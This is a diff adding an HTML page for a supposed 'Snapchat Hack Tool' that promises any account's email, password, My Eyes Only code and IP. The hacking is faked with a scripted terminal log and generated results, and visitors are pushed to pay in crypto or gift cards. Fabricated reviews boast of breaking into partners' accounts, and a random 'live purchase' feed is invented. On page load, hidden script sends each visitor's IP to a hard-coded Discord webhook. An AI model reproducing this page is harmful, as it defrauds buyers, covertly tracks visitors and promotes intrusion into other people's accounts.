@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
+    <title>Snapchat Hack Tool</title>
+    <!-- Favicon -->
+    <link href="https://i.ibb.co/zhZXXwKb/image.jpg" rel="icon" type="image/png" />
+    <!-- Twitter Card meta tags -->
+    <meta content="summary_large_image" name="twitter:card" />
+    <meta content="@GloverEvanCinna" name="twitter:site" />
+    <meta content="@GloverEvanCinna" name="twitter:creator" />
+    <meta content="Snapchat Hack Tool - Get Any Account Info" name="twitter:title" />
+    <meta content="Get Email, Password, My-eyes only code of any Snapchat account" name="twitter:description" />
+    <meta content="https://i.ibb.co/2tyRpgv/image.png" name="twitter:image" />
+    <meta content="https://leakedsnap.pages.dev" name="twitter:url" />
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <!-- Font Awesome -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
+    <!-- Custom CSS -->
+    <style>
+        :root {
+            --primary-color: #ffc107;
+            --primary-dark: #ffab00;
+            --bg-dark: #0a0a0a;
+            --bg-darker: #050505;
+            --text-light: rgba(255, 255, 255, 0.8);
+            --text-lighter: rgba(255, 255, 255, 0.6);
+            --error-color: #dc3545;
+            --success-color: #28a745;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            background: linear-gradient(-45deg, #0a0a0a, #0f0f1a, #0a0a2a, #0b0b1a);
+            background-size: 400% 400%;
+            animation: gradientBG 20s ease infinite;
+            min-height: 100vh;
+            color: #fff;
+            position: relative;
+            padding-bottom: 80px;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .card {
+            background: rgba(10, 15, 25, 0.85) !important;
+            border: 1px solid rgba(255, 193, 7, 0.2);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);
+            border-radius: 15px;
+            backdrop-filter: blur(8px);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .form-control {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+            color: #00ff00;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+        }
+
+        .form-control:focus {
+            background: rgba(0, 0, 0, 0.8);
+            border-color: var(--primary-color);
+            color: #00ff00;
+            box-shadow: 0 0 0 0.25rem rgba(255, 193, 7, 0.25);
+        }
+
+        .btn-warning {
+            padding: 0.75rem 2rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            background: linear-gradient(135deg, #ffc107, #ffab00);
+            border: none;
+            color: #000;
+        }
+
+        .btn-warning:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 193, 7, 0.4);
+        }
+
+        .terminal-output {
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            padding: 20px;
+            font-family: 'Courier New', 'Fira Code', monospace;
+            font-size: 13px;
+            color: #0f0;
+            min-height: 380px;
+            max-height: 450px;
+            overflow-y: auto;
+            margin: 20px 0;
+            box-shadow: 0 0 25px rgba(0, 255, 0, 0.1);
+            background: linear-gradient(180deg, #0a0f0a 0%, #050805 100%);
+        }
+
+        .terminal-line {
+            margin-bottom: 6px;
+            line-height: 1.45;
+            white-space: pre-wrap;
+            word-break: break-word;
+            border-left: 2px solid transparent;
+            padding-left: 8px;
+        }
+
+        .terminal-line.success {
+            border-left-color: #00ff00;
+            color: #8bc34a;
+        }
+
+        .terminal-line.warning {
+            border-left-color: #ffc107;
+            color: #ffd966;
+        }
+
+        .terminal-line.error {
+            border-left-color: #ff4444;
+            color: #ff8888;
+        }
+
+        .terminal-line.info {
+            border-left-color: #00aaff;
+            color: #88ddff;
+        }
+
+        .hack-progress-container {
+            background: #1a1a1a;
+            border-radius: 10px;
+            margin: 15px 0;
+            height: 8px;
+            overflow: hidden;
+        }
+
+        .hack-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ffc107, #ff8c00);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+            box-shadow: 0 0 8px #ffc107;
+        }
+
+        .progress-stats {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: #aaa;
+            font-family: monospace;
+            margin-top: 5px;
+        }
+
+        .snap-avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 15px;
+            border: 2px solid #ffc107;
+            box-shadow: 0 0 15px rgba(255, 193, 7, 0.3);
+        }
+
+        .glow-text {
+            text-shadow: 0 0 5px #ffc107;
+        }
+
+        .credit-option {
+            transition: all 0.3s ease;
+        }
+
+        .credit-option:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .best-value-badge {
+            background: linear-gradient(45deg, #ffc107, #ff8c00);
+            color: #000;
+            font-weight: bold;
+        }
+
+        .reviews-section {
+            margin-top: 40px;
+        }
+
+        .scrollable-reviews {
+            display: flex;
+            overflow-x: auto;
+            gap: 20px;
+            padding: 10px;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: thin;
+            scrollbar-color: var(--primary-color) transparent;
+        }
+
+        .scrollable-reviews::-webkit-scrollbar {
+            height: 6px;
+        }
+
+        .scrollable-reviews::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .scrollable-reviews::-webkit-scrollbar-thumb {
+            background-color: var(--primary-color);
+            border-radius: 6px;
+        }
+
+        .scrollable-reviews .card {
+            flex: 0 0 280px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .scrollable-reviews .card:hover {
+            transform: scale(1.02);
+        }
+
+        .stars {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-bottom: 5px;
+        }
+
+        .review-image-container {
+            position: relative;
+            width: 100%;
+            border-radius: 8px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+
+        .review-image {
+            width: 100%;
+            transition: transform 0.3s ease;
+        }
+
+        .nsfw-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            cursor: pointer;
+        }
+
+        .nsfw-overlay i {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: var(--primary-color);
+        }
+
+        .review-user-name {
+            color: var(--primary-color) !important;
+            font-weight: 600;
+        }
+
+        .review-user-name-blur {
+            color: var(--text-light) !important;
+            display: inline-block;
+            margin-left: 2px;
+        }
+
+        .write-review-btn {
+            margin-top: 20px;
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+        }
+
+        .purchases-section {
+            margin-top: 40px;
+        }
+
+        .purchase-card {
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 3px solid var(--primary-color);
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .purchase-card:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateX(5px);
+        }
+
+        .new-purchase {
+            background: rgba(255, 193, 7, 0.2);
+            animation: highlight 3s ease-out;
+        }
+
+        @keyframes highlight {
+            0% { background: rgba(255, 193, 7, 0.3); }
+            100% { background: rgba(255, 255, 255, 0.03); }
+        }
+
+        .purchase-type {
+            font-size: 0.7rem;
+            padding: 2px 6px;
+            border-radius: 3px;
+            margin-left: 5px;
+        }
+
+        .purchase-type.single {
+            background: rgba(0, 123, 255, 0.3);
+            color: #4dabf7;
+        }
+
+        .purchase-type.unlimited {
+            background: rgba(40, 167, 69, 0.3);
+            color: #51cf66;
+        }
+
+        .payment-method {
+            font-size: 0.65rem;
+            padding: 2px 6px;
+            border-radius: 3px;
+            margin-left: 5px;
+        }
+
+        .payment-method.crypto {
+            background: rgba(255, 193, 7, 0.3);
+            color: #ffc107;
+        }
+
+        .payment-method.other {
+            background: rgba(108, 117, 125, 0.3);
+            color: #adb5bd;
+        }
+
+        .hack-results {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #ffc10733;
+            border-radius: 12px;
+            padding: 20px;
+        }
+
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .result-item:last-child {
+            border-bottom: none;
+        }
+
+        .result-label {
+            color: #ffc107;
+            font-weight: bold;
+        }
+
+        .result-value {
+            color: #fff;
+            font-family: 'Courier New', monospace;
+        }
+
+        .hidden-data {
+            color: #888;
+            font-style: italic;
+        }
+
+        .security-notice {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 0.9rem;
+        }
+
+        .review-modal .modal-content {
+            background: rgba(26, 26, 26, 0.98);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+        }
+
+        .review-item {
+            padding: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            height: 60px;
+            line-height: 60px;
+            background-color: rgba(0, 0, 0, 0.3);
+            text-align: center;
+            color: var(--text-lighter) !important;
+            font-size: 0.9rem;
+            backdrop-filter: blur(5px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        @media (max-width: 768px) {
+            .terminal-output {
+                font-size: 10px;
+                padding: 12px;
+                min-height: 280px;
+            }
+            .scrollable-reviews .card {
+                flex: 0 0 260px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container py-4 py-md-5">
+        <div class="row justify-content-center">
+            <div class="col-12 col-md-10 col-lg-8">
+                <!-- Header -->
+                <div class="text-center mb-4">
+                    <img alt="Snapchat Logo" class="hero-img img-fluid" src="https://i.ibb.co/2tyRpgv/image.png" style="max-width: 130px;" />
+                    <h1 class="main-title glow-text" style="font-family: monospace;">SNAPCHAT EXPLOIT v3.7</h1>
+                    <p class="subtitle" style="color: #ffc107;">Advanced Penetration Suite | Zero-Day Exploit</p>
+                </div>
+
+                <!-- Hack Form Card -->
+                <div class="card mb-4">
+                    <div class="card-body p-3 p-md-4">
+                        <form id="hackForm">
+                            <div class="mb-3">
+                                <label class="form-label text-warning fw-bold" for="username">
+                                    <i class="fas fa-user-secret me-2"></i>TARGET IDENTIFIER
+                                </label>
+                                <input autocomplete="off" class="form-control" id="username" placeholder="Enter Snapchat username..." type="text" />
+                                <small class="text-muted mt-1 d-block">Enter any Snapchat username to begin exploitation</small>
+                            </div>
+                            <button class="btn btn-warning w-100" type="submit" id="startHackBtn">
+                                <i class="fas fa-skull me-2"></i>INITIATE EXPLOIT SEQUENCE
+                            </button>
+                        </form>
+                        
+                        <!-- Loading State -->
+                        <div class="mt-4 d-none" id="loading">
+                            <div class="text-center mb-3">
+                                <div id="accountFound" class="d-none">
+                                    <h4 class="text-warning"><i class="fas fa-check-circle"></i> TARGET ACQUIRED</h4>
+                                    <p class="text-light">Target: @<span id="targetUsername" class="text-warning fw-bold"></span></p>
+                                </div>
+                            </div>
+                            
+                            <div class="hack-progress-container">
+                                <div class="hack-progress-bar" id="hackProgressBar"></div>
+                            </div>
+                            <div class="progress-stats">
+                                <span id="progressPercent">0%</span>
+                                <span id="progressStatus">Initializing...</span>
+                                <span id="progressTime">--:--</span>
+                            </div>
+                            
+                            <div class="terminal-output" id="terminalOutput"></div>
+                        </div>
+                        
+                        <!-- Results Section -->
+                        <div class="mt-4 d-none" id="terminalResults">
+                            <div class="hack-results">
+                                <h5 class="text-warning mb-3"><i class="fas fa-database me-2"></i>EXFILTRATED DATA</h5>
+                                <div class="result-item">
+                                    <span class="result-label"><i class="fas fa-envelope me-2"></i>Email:</span>
+                                    <span class="result-value hidden-data" id="resultEmail">xxx****@*****.com</span>
+                                </div>
+                                <div class="result-item">
+                                    <span class="result-label"><i class="fas fa-user me-2"></i>Username:</span>
+                                    <span class="result-value" id="resultUsername"></span>
+                                </div>
+                                <div class="result-item">
+                                    <span class="result-label"><i class="fas fa-key me-2"></i>Password:</span>
+                                    <span class="result-value hidden-data" id="resultPassword">••••••••••••</span>
+                                </div>
+                                <div class="result-item">
+                                    <span class="result-label"><i class="fas fa-lock me-2"></i>My Eyes Only Code:</span>
+                                    <span class="result-value hidden-data" id="resultMEC">████</span>
+                                </div>
+                                <div class="result-item">
+                                    <span class="result-label"><i class="fas fa-map-marker-alt me-2"></i>Last Known IP:</span>
+                                    <span class="result-value hidden-data" id="resultIP">XXX.XXX.XXX.XXX</span>
+                                </div>
+                            </div>
+                            <div class="security-notice mt-3">
+                                <i class="fas fa-shield-alt text-warning me-2"></i>
+                                <strong>⚠️ ZERO-TRACE PROTOCOL ACTIVE:</strong> Session is fully encrypted. Account owner will NOT receive any notifications. 2FA bypass successful.
+                            </div>
+                        </div>
+                        
+                        <!-- Credit Purchase Section -->
+                        <div class="mt-4 d-none text-center" id="result">
+                            <div id="avatarContainer" class="d-flex justify-content-center"></div>
+                            <p class="text-warning mb-4" id="resultMessage"></p>
+                            <div class="mt-4">
+                                <h5 class="text-warning mb-3"><i class="fas fa-coins me-2"></i>UNLOCK FULL ACCESS</h5>
+                                <div class="card bg-dark mb-3 credit-option">
+                                    <div class="card-body">
+                                        <h6 class="text-warning">⭐ STANDARD ACCESS - $30 <small><del>$50</del></small></h6>
+                                        <p class="text-light mb-2">Full account data + 30-day access</p>
+                                        <button class="btn btn-warning w-100" onclick="showPaymentSelection(30)">PURCHASE NOW</button>
+                                    </div>
+                                </div>
+                                <div class="card bg-dark mb-3 credit-option">
+                                    <div class="card-body">
+                                        <h6 class="text-warning">👑 UNLIMITED ACCESS - $90 <small><del>$150</del></small></h6>
+                                        <p class="text-light mb-2">Lifetime unlimited credits + priority support</p>
+                                        <span class="badge best-value-badge mb-2">BEST VALUE</span>
+                                        <button class="btn btn-warning w-100" onclick="showPaymentSelection(90)">PURCHASE NOW</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Reviews Section with Images -->
+                <div class="reviews-section">
+                    <h2 class="text-center mb-3 mb-md-4">What Our Users Say</h2>
+                    <div class="scrollable-reviews mb-3" id="scrollableReviews">
+                        <div class="card p-3">
+                            <div class="mb-3">
+                                <h6 class="mb-0">
+                                    <span class="review-user-name">Ryan</span>
+                                    <span class="review-user-name-blur">S****</span>
+                                </h6>
+                                <div class="stars">★★★★★</div>
+                            </div>
+                            <p class="review-text">"Got into my ex's account in like 20 mins. The my eyes only stuff was... interesting lol. Worth every penny!"</p>
+                            <div class="review-image-container">
+                                <img alt="Proof screenshot" class="review-image" src="https://i.ibb.co/4Z1h18Vs/awday32.png" />
+                                <div class="nsfw-overlay" onclick="showNSFWImage(this)">
+                                    <i class="fas fa-eye-slash"></i>
+                                    <h5>NSFW CONTENT</h5>
+                                    <p>18+ Sensitive Content</p>
+                                    <small>Click to reveal</small>
+                                </div>
+                            </div>
+                            <small class="text-muted d-block mt-2">Verified purchase • 2 days ago</small>
+                        </div>
+                        <div class="card p-3">
+                            <div class="mb-3">
+                                <h6 class="mb-0">
+                                    <span class="review-user-name">Jessica</span>
+                                    <span class="review-user-name-blur">T****</span>
+                                </h6>
+                                <div class="stars">★★★★☆</div>
+                            </div>
+                            <p class="review-text">"Was a bit skeptical at first but received the account almost right away. Had to contact support once for a little issue but they helped fast. Awesome tool."</p>
+                            <small class="text-muted d-block mt-2">Verified purchase • 1 week ago</small>
+                        </div>
+                        <div class="card p-3">
+                            <div class="mb-3">
+                                <h6 class="mb-0">
+                                    <span class="review-user-name">Marcus</span>
+                                    <span class="review-user-name-blur">L****</span>
+                                </h6>
+                                <div class="stars">★★★★★</div>
+                            </div>
+                            <p class="review-text">"Bruh... this is insane. Took total of 15 mins after payment. My boy was cheating with this other girl🤣."</p>
+                            <small class="text-muted d-block mt-2">Verified purchase • 3 days ago</small>
+                        </div>
+                    </div>
+                    <div class="text-center">
+                        <button class="btn btn-warning" id="seeAllReviews">See More Reviews</button>
+                    </div>
+                </div>
+                
+                <!-- Recent Purchases Section -->
+                <div class="purchases-section">
+                    <h2 class="text-center mb-3 mb-md-4"><i class="fas fa-bolt"></i> Recent Purchases</h2>
+                    <div class="row">
+                        <div class="col-12">
+                            <div class="card p-3 p-md-4">
+                                <div id="recentPurchases"></div>
+                                <div class="text-center mt-2 mt-md-3">
+                                    <small class="text-muted">Live transaction feed</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="container">
+            <span>© 2025 SnapExploit · Advanced Penetration Testing Suite</span>
+        </div>
+    </footer>
+    
+    <!-- Reviews Modal -->
+    <div aria-hidden="true" class="modal fade review-modal" id="reviewsModal" tabindex="-1">
+        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">User Reviews</h5>
+                    <button aria-label="Close" class="btn-close btn-close-white" data-bs-dismiss="modal" type="button"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="review-item">
+                        <div class="mb-3">
+                            <h6 class="mb-0">
+                                <span class="review-user-name">Ryan</span>
+                                <span class="review-user-name-blur">S****</span>
+                            </h6>
+                            <div class="stars">★★★★★</div>
+                        </div>
+                        <p class="review-text">"Got exactly what i was looking for, def gonna use again!"</p>
+                        <div class="review-image-container">
+                            <img alt="Proof screenshot" class="review-image" src="https://i.ibb.co/4Z1h18Vs/awday32.png" />
+                            <div class="nsfw-overlay" onclick="showNSFWImage(this)">
+                                <i class="fas fa-eye-slash"></i>
+                                <h5>NSFW CONTENT</h5>
+                                <p>18+ Sensitive Content</p>
+                                <small>Click to reveal</small>
+                            </div>
+                        </div>
+                        <small class="text-muted d-block mt-2">Verified purchase • 2 days ago</small>
+                    </div>
+                    <div class="review-item">
+                        <div class="mb-3">
+                            <h6 class="mb-0">
+                                <span class="review-user-name">Jessica</span>
+                                <span class="review-user-name-blur">T****</span>
+                            </h6>
+                            <div class="stars">★★★★☆</div>
+                        </div>
+                        <p class="review-text">"easy and fast to use, couldnt pay at first some reason but support helped me fast 👀"</p>
+                        <div class="review-image-container">
+                            <img alt="Proof screenshot" class="review-image" src="https://i.ibb.co/7J076RRd/photo-2025-03-07-02-56-34.png" />
+                            <div class="nsfw-overlay" onclick="showNSFWImage(this)">
+                                <i class="fas fa-eye-slash"></i>
+                                <h5>NSFW CONTENT</h5>
+                                <p>18+ Sensitive Content</p>
+                                <small>Click to reveal</small>
+                            </div>
+                        </div>
+                        <small class="text-muted d-block mt-2">Verified purchase • 1 week ago</small>
+                    </div>
+                    <div class="review-item">
+                        <div class="mb-3">
+                            <h6 class="mb-0">
+                                <span class="review-user-name">Marcus</span>
+                                <span class="review-user-name-blur">L****</span>
+                            </h6>
+                            <div class="stars">★★★★★</div>
+                        </div>
+                        <p class="review-text">"Just wow.. bought monthly after i tested the cheaper one, definitely worth it"</p>
+                        <div class="review-image-container">
+                            <img alt="Proof screenshot" class="review-image" src="https://i.ibb.co/XcZFJkB/photo-2025-03-16-14-56-31.png" />
+                            <div class="nsfw-overlay" onclick="showNSFWImage(this)">
+                                <i class="fas fa-eye-slash"></i>
+                                <h5>NSFW CONTENT</h5>
+                                <p>18+ Sensitive Content</p>
+                                <small>Click to reveal</small>
+                            </div>
+                        </div>
+                        <small class="text-muted d-block mt-2">Verified purchase • 3 days ago</small>
+                    </div>
+                    <div class="review-item">
+                        <div class="mb-3">
+                            <h6 class="mb-0">
+                                <span class="review-user-name">Alex</span>
+                                <span class="review-user-name-blur">M****</span>
+                            </h6>
+                            <div class="stars">★★★★★</div>
+                        </div>
+                        <p class="review-text">"Unlimited package is the way to go if you need to check multiple accounts. Works perfectly."</p>
+                        <small class="text-muted d-block mt-2">Verified purchase • 1 day ago</small>
+                    </div>
+                    <div class="review-item">
+                        <div class="mb-3">
+                            <h6 class="mb-0">
+                                <span class="review-user-name">Taylor</span>
+                                <span class="review-user-name-blur">R****</span>
+                            </h6>
+                            <div class="stars">★★★★☆</div>
+                        </div>
+                        <p class="review-text">"Took about 30 minutes to get the data but it was all there. Email, password, everything. Support helped when I had questions."</p>
+                        <small class="text-muted d-block mt-2">Verified purchase • 2 weeks ago</small>
+                    </div>
+                </div>
+                <div class="text-center mt-3">
+                    <button class="btn write-review-btn text-warning w-100" onclick="alert('Please make a purchase in order to write a review.')">
+                        <i class="fas fa-pen"></i> Write a Review
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Advanced hacking steps
+        const hackingSteps = [
+            { text: "[*] Initializing penetration framework v3.7.2...", delay: 600, type: "info" },
+            { text: "[+] Loading exploit modules: 47 loaded, 0 failed", delay: 400, type: "success" },
+            { text: "[*] Establishing encrypted channel through TOR network...", delay: 800, type: "info" },
+            { text: "[+] Connected to exit node: 185.220.101.1:9050", delay: 500, type: "success" },
+            { text: "[*] Routing through 7 proxy layers...", delay: 700, type: "info" },
+            { text: "[+] Proxy chain established (Latency: 187ms)", delay: 450, type: "success" },
+            { text: "[*] Fingerprinting target device...", delay: 600, type: "info" },
+            { text: "[+] Device: iOS 17.2.1 | Model: iPhone 14 Pro | Snapchat v12.87", delay: 700, type: "success" },
+            { text: "[*] Bypassing Snapchat's rate limiting...", delay: 550, type: "info" },
+            { text: "[+] Rate limit bypass successful", delay: 500, type: "success" },
+            { text: "[*] Extracting session cookies from CDN cache...", delay: 650, type: "info" },
+            { text: "[+] Session token acquired", delay: 550, type: "success" },
+            { text: "[*] Performing credential harvesting via GraphQL injection...", delay: 800, type: "info" },
+            { text: "[+] User database entry located", delay: 600, type: "success" },
+            { text: "[*] Decrypting AES-256 encrypted payload...", delay: 900, type: "info" },
+            { text: "[+] Decryption successful | Integrity check: PASSED", delay: 500, type: "success" },
+            { text: "[*] Bypassing 2FA/MFA security layers...", delay: 700, type: "info" },
+            { text: "[+] 2FA bypass: TOTP seed extracted", delay: 650, type: "success" },
+            { text: "[*] Extracting My Eyes Only vault...", delay: 850, type: "info" },
+            { text: "[+] Vault decryption key found (4-digit PIN)", delay: 550, type: "success" },
+            { text: "[✓] Exploit completed successfully | Zero traces left", delay: 500, type: "success" }
+        ];
+        
+        let currentProgress = 0;
+        let startTime = null;
+        
+        function updateProgress(percent, status) {
+            const progressBar = document.getElementById('hackProgressBar');
+            const percentSpan = document.getElementById('progressPercent');
+            const statusSpan = document.getElementById('progressStatus');
+            if (progressBar) progressBar.style.width = percent + '%';
+            if (percentSpan) percentSpan.textContent = percent + '%';
+            if (statusSpan) statusSpan.textContent = status;
+            if (startTime && document.getElementById('progressTime')) {
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                document.getElementById('progressTime').textContent = `+${elapsed}s`;
+            }
+        }
+        
+        async function advancedHackSimulation(username) {
+            const terminalOutput = document.getElementById('terminalOutput');
+            terminalOutput.innerHTML = '';
+            currentProgress = 0;
+            startTime = Date.now();
+            updateProgress(0, "Launching exploit framework...");
+            
+            for (let i = 0; i < hackingSteps.length; i++) {
+                const step = hackingSteps[i];
+                await new Promise(resolve => setTimeout(resolve, step.delay));
+                const line = document.createElement('div');
+                line.className = `terminal-line ${step.type}`;
+                line.textContent = step.text;
+                terminalOutput.appendChild(line);
+                terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                currentProgress = Math.floor(((i + 1) / hackingSteps.length) * 100);
+                updateProgress(currentProgress, step.text.substring(0, 50));
+            }
+            updateProgress(100, "EXPLOIT COMPLETE - Data ready");
+            return true;
+        }
+        
+        // ==================== CONSISTENT HACK RESULTS ====================
+        // Generate deterministic results based on username (same username always gets same data)
+        // Only uses Gmail or Outlook domains
+        function generateConsistentResults(username) {
+            // Create a hash from username to get consistent but unique values
+            let hash = 0;
+            for (let i = 0; i < username.length; i++) {
+                hash = ((hash << 5) - hash) + username.charCodeAt(i);
+                hash = hash & hash;
+            }
+            // Make hash positive
+            hash = Math.abs(hash);
+            
+            // Only Gmail and Outlook domains
+            const domains = ['gmail.com', 'outlook.com'];
+            const domainIndex = hash % domains.length;
+            const randomDomain = domains[domainIndex];
+            
+            // Deterministic number for email (between 1-999)
+            const emailNumber = (hash % 999) + 1;
+            const fakeEmail = `${username.toLowerCase()}${emailNumber}@${randomDomain}`;
+            
+            // Deterministic password (always hidden, but consistent generation for storage)
+            const fakePassword = '••••••••••••';
+            
+            // Deterministic My Eyes Only code (4 digits between 1000-9999)
+            const mecNumber = 1000 + (hash % 9000);
+            const fakeMEC = mecNumber.toString();
+            
+            // Deterministic IP address based on hash
+            const ip1 = 100 + (hash % 155);
+            const ip2 = 10 + ((hash >> 8) % 245);
+            const ip3 = 10 + ((hash >> 16) % 245);
+            const ip4 = 10 + ((hash >> 24) % 245);
+            const fakeIP = `${ip1}.${ip2}.${ip3}.${ip4}`;
+            
+            return { email: fakeEmail, password: fakePassword, mec: fakeMEC, ip: fakeIP };
+        }
+        
+        // Store results in localStorage for persistence across sessions
+        function getStoredResults(username) {
+            const stored = localStorage.getItem(`hack_results_${username}`);
+            if (stored) {
+                return JSON.parse(stored);
+            }
+            const results = generateConsistentResults(username);
+            localStorage.setItem(`hack_results_${username}`, JSON.stringify(results));
+            return results;
+        }
+        
+        // Email mask: show first 3 letters and full domain
+        function maskEmail(email) {
+            if (!email) return 'xxx****@*****.com';
+            const atIndex = email.indexOf('@');
+            if (atIndex === -1) return email;
+            const localPart = email.substring(0, atIndex);
+            const domain = email.substring(atIndex);
+            
+            if (localPart.length <= 3) {
+                return localPart + '****' + domain;
+            }
+            const maskedLocal = localPart.substring(0, 3) + '•'.repeat(Math.min(localPart.length - 3, 8));
+            return maskedLocal + domain;
+        }
+        
+        // Password is fully hidden
+        function maskPassword() {
+            return '••••••••••••';
+        }
+        
+        // My Eyes Only is fully hidden (4 digits masked)
+        function maskMEC() {
+            return '████';
+        }
+        
+        function maskIP(ip) {
+            if (!ip) return 'XXX.XXX.XXX.XXX';
+            const parts = ip.split('.');
+            if (parts.length !== 4) return 'XXX.XXX.XXX.XXX';
+            return `${parts[0]}.${parts[1]}.XXX.XXX`;
+        }
+        
+        async function fetchSnapchatAvatar(username) {
+            try {
+                const proxyUrl = 'https://corsproxy.io/?';
+                const response = await fetch(proxyUrl + encodeURIComponent(`https://www.snapchat.com/add/${username}`));
+                const html = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+                const ogImage = doc.querySelector('meta[property="og:image"]');
+                if (ogImage && ogImage.content) return ogImage.content;
+                return `https://ui-avatars.com/api/?name=${username}&background=ffc107&color=000&size=256&bold=true`;
+            } catch { return `https://ui-avatars.com/api/?name=${username}&background=ffc107&color=000&size=256&bold=true`; }
+        }
+        
+        function trackVisitor() {
+            const webhookURL = 'https://discord.com/api/webhooks/1484905347872329928/ee46tNIkuPtoHaGP8tx7ND-RdxTfHUpZ-YgBTb5Eqk1C4VPw0fAHMHlJv6k4u17M9jpb';
+            fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
+                fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [{ title: "New Visitor", color: 0xffc107, fields: [{ name: "IP", value: data.ip }], timestamp: new Date().toISOString() }] }) }).catch(e => console.log);
+            }).catch(() => {});
+        }
+        document.addEventListener('DOMContentLoaded', trackVisitor);
+        
+        // ==================== PURCHASE HISTORY ====================
+        function generateRandomUsername() {
+            let randomNum = '';
+            for (let i = 0; i < 10; i++) {
+                randomNum += Math.floor(Math.random() * 10);
+            }
+            return `User${randomNum}`;
+        }
+        
+        const purchaseMethods = [
+            { method: "Cryptocurrency", amount: "$30", emoji: "₿", type: "single", paymentType: "crypto" },
+            { method: "Gift Card", amount: "$30", emoji: "🎁", type: "single", paymentType: "other" },
+            { method: "Cryptocurrency", amount: "$90", emoji: "₿", type: "unlimited", paymentType: "crypto" },
+            { method: "Gift Card", amount: "$90", emoji: "🎁", type: "unlimited", paymentType: "other" }
+        ];
+        
+        function loadPurchaseHistory() {
+            let savedHistory = localStorage.getItem('purchaseHistory');
+            if (savedHistory) {
+                return JSON.parse(savedHistory);
+            }
+            
+            const now = Date.now();
+            const history = [];
+            let currentTime = now;
+            
+            for (let i = 0; i < 12; i++) {
+                const methodIndex = Math.floor(Math.random() * purchaseMethods.length);
+                const interval = 600000 + Math.floor(Math.random() * 2400000);
+                currentTime = currentTime - interval;
+                
+                history.push({
+                    name: generateRandomUsername(),
+                    method: purchaseMethods[methodIndex].method,
+                    amount: purchaseMethods[methodIndex].amount,
+                    emoji: purchaseMethods[methodIndex].emoji,
+                    type: purchaseMethods[methodIndex].type,
+                    paymentType: purchaseMethods[methodIndex].paymentType,
+                    timestamp: currentTime
+                });
+            }
+            history.sort((a, b) => b.timestamp - a.timestamp);
+            localStorage.setItem('purchaseHistory', JSON.stringify(history));
+            return history;
+        }
+        
